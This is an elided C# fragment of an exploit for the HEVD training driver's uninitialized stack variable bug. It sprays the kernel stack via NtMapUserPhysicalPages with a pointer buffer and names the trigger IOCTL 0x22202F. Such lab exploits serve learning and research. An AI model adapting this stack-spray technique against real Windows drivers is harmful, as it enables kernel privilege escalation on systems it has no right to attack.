...
namespace UninitializedStackVariable
{
    class Program
    {
        ...
        [DllImport("ntdll.dll")]
        static extern int NtMapUserPhysicalPages(
            IntPtr BaseAddress,
            uint NumberOfPages,
        ...
        static void Main()
        {
            ...
            Console.WriteLine("--[ HEVD Exploitation : Uninitialized Stack Variable\n");
            ...
            // Step 3: Stack spray and trigger vulnerability
            uint ioctl = 0x22202F;
            byte[] payload = BitConverter.GetBytes(0xdeadbeef);
            int BytesReturned = 0;
            byte[] StackSprayPayload = new byte[1024 * Marshal.SizeOf(typeof(IntPtr))];
            ...
            {
                destination = i * Marshal.SizeOf(typeof(IntPtr));
                Buffer.BlockCopy(pointer, 0, StackSprayPayload, destination, size);
            }

            Console.WriteLine("[>] Stack spraying and triggering vulnerability");
            NtMapUserPhysicalPages(IntPtr.Zero, 1024, StackSprayPayload);
